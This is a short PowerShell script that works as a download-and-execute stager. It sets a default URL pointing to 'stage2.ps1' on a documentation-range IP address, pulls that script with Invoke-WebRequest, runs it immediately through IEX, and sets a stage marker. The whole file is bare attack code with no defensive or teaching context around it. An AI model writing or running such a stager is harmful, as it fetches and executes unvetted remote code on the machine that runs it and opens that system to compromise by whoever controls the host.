[CmdletBinding()]
param(
    [string]$TransferUrl = 'http://192.0.2.153/stage2.ps1',
    [int]$StageTimeout = 152
)
IEX (Invoke-WebRequest -Uri $TransferUrl -UseBasicParsing).Content
$StageMarker = "stage-5"
